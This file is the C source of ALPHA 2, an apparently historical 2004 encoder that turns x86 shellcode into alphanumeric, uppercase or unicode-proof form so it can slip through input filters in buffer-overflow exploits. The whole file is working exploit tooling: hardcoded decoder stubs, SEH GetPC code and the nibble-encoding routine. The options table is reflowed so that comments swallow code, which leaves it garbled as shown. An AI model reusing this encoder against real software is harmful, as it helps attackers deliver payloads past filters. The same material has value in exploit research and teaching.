#include <stdio.h> // printf(), fprintf(), stderr
#include <stdlib.h> // exit(), EXIT_SUCCESS, EXIT_FAILURE
#include <string.h> // strcasecmp(), strstr()

#define VERSION_STRING "ALPHA 2: Zero-tolerance. (build 0.5)"

//-----------------------------------------------------------------------------
void banner(char* name) {
  printf(
    "____________________________________________________________________________\n"
    "\n"
    "    ,sSSs,,s,  " VERSION_STRING "\n"
    "   SS\"  Y$P\"\n"
    "  iS'   dY     Unicode-proof, uppercase, alphanumeric shellcode encoding.\n"
    "  YS,  dSb     Copyright (C) 2004 by Berend-Jan Wever.\n"
    "  `\"YSS'\"S'    <skylined@edup.tudelft.nl>\n"
    "____________________________________________________________________________\n"
    "\n"
    "Type \"%s help\" for usage information\n"
    "\n"
    "Acknowledgements:\n"
    "  Thanks to rix for his phrack article on aphanumeric shellcode.\n"
    "  Thanks to obscou for his phrack article on unicode-proof shellcode.\n"
    "  Thanks to Costin Ionescu for the idear behind w32 SEH GetPC code.\n"
    "  Thanks to 0dd for help, information and feedback.\n"
    "\n", name
  );
}

//-----------------------------------------------------------------------------
void usage(char* name) {
  printf(
    "Usage: %s [unicode,][uppercase,|mixedcase,]baseaddress\n"
    "  Reads shellcode from stdin and encodes it to stdout. Resulting code contains\n"
    "  only alphanumeric characters* (0-9 and A-Z) and can optionaly be uppercase\n"
    "  and/or unicode-proof. It is a fully working version of the origional shellcode.\n"
    "\n"
    "  All decoders needs to know the baseaddress of their code. You must specify the\n"
    "  source of the baseaddress. Accepted values include:\n"
    "  Registers: eax, ebx, ecx, edx, esi, edi, esp and ebp.\n"
    "  Stack locations: [esp-8], [esp-4], [esp], [esp+4] and [esp+8]\n"
    "  SEH GetPC code (winNT/2K/XP only): seh\n"
    "  Not all options can be combined, use \"%s help\" to get a list of options.\n"
    "  You can also use \"%s help keyword [keyword] ...\" to get detailed information\n"
    "  on all encoding options containing your keyword(s).\n"
    "\n"
    "Examples:\n"
    "  cat shellcode | %s uppercase,eax > encoded_shellcode\n"
    "  cat shellcode | %s uppercase,seh > encoded_win2k_shellcode\n"
    "  cat shellcode | %s unicode,mixedcase,ecx>> unicode_seh_overwrite_exploit\n"
    "  %s help unicode uppercase ecx\n"
    "\n", name, name, name, name, name
  );
}

#define w32_SEH_GetPC_mixed_code "VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089"
#define w32_SEH_GetPC_upper_code "VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYYP5YYYD5KKYAPTTX638TDDNVDDX4Z4A63861816"

#define unicode_upper_main_code "QATAXAZAPA35GAAYARAPAZ111AYAP1A5PAAPAZ1AA1AAA5EAAPAZ11AAAAAAAAAXA52AAPAZ1AA1A51AAPAZ1A5DAAPAZAQAQAAHF6A"
#define unicode_upper_eax_code "PP4444YA" unicode_upper_main_code
#define unicode_upper_ebx_code "SS4444YA" unicode_upper_main_code
#define unicode_upper_ecx_code "44444444" unicode_upper_main_code
#define unicode_upper_edx_code "RR4444YA" unicode_upper_main_code
#define unicode_upper_esi_code "VV4444YA" unicode_upper_main_code
#define unicode_upper_edi_code "WW4444YA" unicode_upper_main_code
#define unicode_upper_esp_code "TU4444YA" unicode_upper_main_code
#define unicode_upper_ebp_code "UU4444YA" unicode_upper_main_code
#define unicode_upper_stack_code "YA444444" unicode_upper_main_code
#define unicode_upper_stack_pop_code "YUYA4444" unicode_upper_main_code
#define unicode_upper_stack_pop_pop_code "YUYUYA44" unicode_upper_main_code

#define unicode_mixed_main_code "QAhgAAXATAZbYa5PAa51AaQbYa5vAaKa5cAajjjAAQAQAQAaFVu"
#define unicode_mixed_eax_code "PP44" unicode_mixed_main_code
#define unicode_mixed_ebx_code "SS44" unicode_mixed_main_code
#define unicode_mixed_ecx_code "4444" unicode_mixed_main_code
#define unicode_mixed_edx_code "RR44" unicode_mixed_main_code
#define unicode_mixed_esi_code "VV44" unicode_mixed_main_code
#define unicode_mixed_edi_code "WW44" unicode_mixed_main_code
#define unicode_mixed_esp_code "TU44" unicode_mixed_main_code
#define unicode_mixed_ebp_code "UU44" unicode_mixed_main_code
#define unicode_mixed_stack_code "YA44" unicode_mixed_main_code
#define unicode_mixed_stack_pop_code "YUYA" unicode_mixed_main_code

#define alpha_decoder_main_code1 "VTX630VX4A0B5HH0B20BBVX2BCBH4A2AC0ACTBCQB0ACAVX4Z8BCJOM"
#define alpha_decoder_main_code2 "VTX630VX4A0B4HH0B10BAVX2BBBH4A2AB0ABTBBQB0ABAVX4Z8BBJOM"
#define alpha_decoder_eax_code "PZJJJJJRY" alpha_decoder_main_code1
#define alpha_decoder_ebx_code "SZJJJJJRY" alpha_decoder_main_code1
#define alpha_decoder_ecx_code  "IIIIIIQZ" alpha_decoder_main_code1
#define alpha_decoder_edx_code "JJJJJJRY" alpha_decoder_main_code1
#define alpha_decoder_esi_code "VZJJJJJRY" alpha_decoder_main_code1
#define alpha_decoder_edi_code "WZJJJJJRY" alpha_decoder_main_code1
#define alpha_decoder_esp_code "TZJJJJJRY" alpha_decoder_main_code1
#define alpha_decoder_ebp_code "UZJJJJJRY" alpha_decoder_main_code1
#define alpha_decoder_stack_pop_pop_code "LLLLLLLLZJRY" alpha_decoder_main_code2
#define alpha_decoder_stack_pop_code "LLLLZJJJRY" alpha_decoder_main_code2
#define alpha_decoder_stack_code "ZJJJJJRY" alpha_decoder_main_code2
#define alpha_decoder_stack_push_code "ZZJJJJJRY" alpha_decoder_main_code1
#define alpha_decoder_stack_push_push_code "ZZZJJJJRY" alpha_decoder_main_code2

struct option { char* id; // id of option char* code; // the code char* help; //
 a short description } options[] = { { "uppercase,eax", alpha_decoder_eax_code,
          "Uppercase, using eax as baseaddress." }, { "uppercase,ebx",
      alpha_decoder_ebx_code, "Uppercase, using ebx as baseaddress." }, {
"uppercase,ecx", alpha_decoder_ecx_code, "Uppercase, using ecx as baseaddress."
     }, { "uppercase,edx", alpha_decoder_edx_code, "Uppercase, using edx as
 baseaddress." }, { "uppercase,esp", alpha_decoder_esp_code, "Uppercase, using
 esp as baseaddress." }, { "uppercase,ebp", alpha_decoder_ebp_code, "Uppercase,
    using enp as baseaddress." }, { "uppercase,esi", alpha_decoder_esi_code,
          "Uppercase, using esi as baseaddress." }, { "uppercase,edi",
      alpha_decoder_edi_code, "Uppercase, using edi as baseaddress." }, {
"uppercase,[esp-8]", alpha_decoder_stack_push_push_code, "Uppercase, using [esp
 -8] as baseaddress." }, { "uppercase,[esp-4]", alpha_decoder_stack_push_code,
       "Uppercase, using [esp-4] as baseaddress." }, { "uppercase,[esp]",
    alpha_decoder_stack_code, "Uppercase, using [esp] as baseaddress." }, {
"uppercase,[esp+4]", alpha_decoder_stack_pop_code, "Uppercase, using [esp+4] as
   baseaddress." }, { "uppercase,[esp+8]", alpha_decoder_stack_pop_pop_code,
        "Uppercase, using [esp+8] as baseaddress." }, { "mixedcase,seh",
w32_SEH_GetPC_mixed_code alpha_decoder_ecx_code, "Mixedcase, using win32 SEH to
     determine baseaddress." }, { "uppercase,seh", w32_SEH_GetPC_upper_code
 alpha_decoder_ecx_code, "Uppercase, using win32 SEH to determine baseaddress."
  }, { "unicode,uppercase,eax", unicode_upper_eax_code alpha_decoder_ecx_code,
           "Unicode-proof, uppercase, using eax as baseaddress." }, {
    "unicode,uppercase,ebx", unicode_upper_ebx_code alpha_decoder_ecx_code,
           "Unicode-proof, uppercase, using ebx as baseaddress." }, {
    "unicode,uppercase,ecx", unicode_upper_ecx_code alpha_decoder_ecx_code,
           "Unicode-proof, uppercase, using ecx as baseaddress." }, {
    "unicode,uppercase,edx", unicode_upper_edx_code alpha_decoder_ecx_code,
           "Unicode-proof, uppercase, using edx as baseaddress." }, {
    "unicode,uppercase,esp", unicode_upper_esp_code alpha_decoder_ecx_code,
 "Unicode-proof, uppercase, using esp as baseaddress.\n  (Memory [ebp] must be
       writeable!)" }, { "unicode,uppercase,ebp", unicode_upper_ebp_code
alpha_decoder_ecx_code, "Unicode-proof, uppercase, using ebp as baseaddress." },
   { "unicode,uppercase,esi", unicode_upper_esi_code alpha_decoder_ecx_code,
           "Unicode-proof, uppercase, using esi as baseaddress." }, {
    "unicode,uppercase,edi", unicode_upper_edi_code alpha_decoder_ecx_code,
           "Unicode-proof, uppercase, using edi as baseaddress." }, {
    "unicode,mixedcase,eax", unicode_mixed_eax_code alpha_decoder_ebp_code,
          "Unicode-proof, mixed-case, using eax as baseaddress." }, {
    "unicode,mixedcase,ebx", unicode_mixed_ebx_code alpha_decoder_ebp_code,
          "Unicode-proof, mixed-case, using ebx as baseaddress." }, {
    "unicode,mixedcase,ecx", unicode_mixed_ecx_code alpha_decoder_ebp_code,
          "Unicode-proof, mixed-case, using ecx as baseaddress." }, {
    "unicode,mixedcase,edx", unicode_mixed_edx_code alpha_decoder_ebp_code,
          "Unicode-proof, mixed-case, using edx as baseaddress." }, {
    "unicode,mixedcase,esp", unicode_mixed_esp_code alpha_decoder_ebp_code,
 "Unicode-proof, mixed-case, using esp as baseaddress.\n  (Memory [ebp] must be
       writeable!)" }, { "unicode,mixedcase,ebp", unicode_mixed_ebp_code
 alpha_decoder_ebp_code, "Unicode-proof, mixed-case, using ebp as baseaddress."
  }, { "unicode,mixedcase,esi", unicode_mixed_esi_code alpha_decoder_ebp_code,
          "Unicode-proof, mixed-case, using esi as baseaddress." }, {
    "unicode,mixedcase,edi", unicode_mixed_edi_code alpha_decoder_ebp_code,
          "Unicode-proof, mixed-case, using edi as baseaddress." }, {
  "unicode,uppercase,[esp]", unicode_upper_stack_code alpha_decoder_ecx_code,
          "Unicode-proof, uppercase, using [esp] as baseaddress." }, {
           "unicode,uppercase,[esp+4]", unicode_upper_stack_pop_code
      alpha_decoder_ecx_code, "Unicode-proof, uppercase, using [esp+4] as
 baseaddress.\n  (Memory [ebp] must be writeable!)" }, { NULL, NULL, NULL } };

//-----------------------------------------------------------------------------
int main(int argc, char* argv[], char* envp[]) {
  int   i, j;
  int   input, lownibble, highnibble, lownibble_encoded, highnibble_encoded;

  if (argc==1) {
    banner(argv[0]);
    exit(EXIT_SUCCESS);
  } else if (strcasecmp(argv[1], "help")==0) {
    for(i=0; options[i].id != NULL; i++) {
      for(j=2; j<argc; j++)
        if (strstr(options[i].id, argv[j]) == NULL)
          break;
      if (j==argc)
        printf("\"%s\":\n  %s\n", options[i].id, options[i].help);
    }
    exit(EXIT_SUCCESS);
  } else if (argc==2) {
    i=0;
    while (strcasecmp(argv[1], options[i].id) != 0) {
      i++;
      if (options[i].id == NULL) {
        fprintf(stderr, "Encoding option not found!\n");
        exit(EXIT_FAILURE);
      }
    }
  } else {
    usage(argv[0]);
  }
  // Output decoders and stuff
  printf("%s", options[i].code);

  // Output encoded shellcode data:
  while ((input = getchar()) != EOF) {
    lownibble = (input & 0x0f);
    highnibble = (input & 0xf0) >> 4;
    lownibble_encoded  = (lownibble ^ 0x41) + 1;
    highnibble_encoded = (highnibble == 0x0 ? 0x50 : highnibble+0x40);
    printf("%c%c", lownibble_encoded, highnibble_encoded);
  }
  // Output end of data marker:
  printf("Z");

  exit(EXIT_SUCCESS);
}
